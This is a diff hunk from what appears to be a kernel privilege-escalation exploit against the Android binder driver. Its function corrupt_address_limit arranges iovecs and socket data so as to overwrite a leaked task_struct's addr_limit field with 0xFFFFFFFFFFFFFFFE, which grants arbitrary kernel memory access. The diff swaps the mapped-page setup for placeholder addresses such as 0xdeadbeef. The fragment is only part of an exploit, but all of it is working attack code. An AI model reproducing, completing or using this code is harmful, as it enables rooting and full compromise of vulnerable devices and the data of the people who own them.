@@ -47,39 +47,23 @@ void corrupt_address_limit(int binder_fd, struct task_struct **leak_task_struct,
 
   INFO("Setting up iovecs");
 
-  *mapped_memory =
-      mmap((void *)0x100000000ul, 2 * PAGE_SIZE, PROT_READ | PROT_WRITE,
-           MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
-
-  if (*mapped_memory == MAP_FAILED) {
-    ERROR("Failed to map 4gb aligned page");
-    exit(EXIT_FAILURE);
-  }
-  SUCCESS("Mapped page: %p", *mapped_memory);
-
   memset(iovecStack, 0, sizeof(iovecStack));
 
   iovecStack[IOVEC_WQ_INDEX].iov_base = *mapped_memory;
   iovecStack[IOVEC_WQ_INDEX].iov_len = 1;
 
-  iovecStack[IOVEC_WQ_INDEX + 1].iov_base =
-      (void *)((char *)(*mapped_memory) + PAGE_SIZE);
-  iovecStack[IOVEC_WQ_INDEX + 1].iov_len = 0x8 + 0x8 + 0x8 + 0x8;
+  iovecStack[IOVEC_WQ_INDEX + 1].iov_base = (void *)0xdeadbeef;
+  iovecStack[IOVEC_WQ_INDEX + 1].iov_len = 0x20;
 
-  iovecStack[IOVEC_WQ_INDEX + 2].iov_base =
-      (void *)((char *)(*mapped_memory) + PAGE_SIZE + PAGE_SIZE);
+  iovecStack[IOVEC_WQ_INDEX + 2].iov_base = (void *)0xbeefdead;
   iovecStack[IOVEC_WQ_INDEX + 2].iov_len = 0x8;
-
-  static char dataBuffer[PAGE_SIZE] = {0};
-
-  struct task_struct *m_task_struct =
-      *(struct task_struct **)(dataBuffer + TASK_STRUCT_OFFSET_IN_LEAKED_DATA);
 
   uint64_t finalSocketData[] = {
       0x1,
-      0x41414141,
-      0x8 + 0x8 + 0x8 + 0x8,
-      (uint64_t)((uint8_t *)m_task_struct + OFFSET_TASK_STRUCT_ADDR_LIMIT),
+      0xdeadbeef,
+      0x20,
+      (uint64_t)((uint8_t *)(*leak_task_struct) +
+                 OFFSET_TASK_STRUCT_ADDR_LIMIT),
       0xFFFFFFFFFFFFFFFE,
   };
 
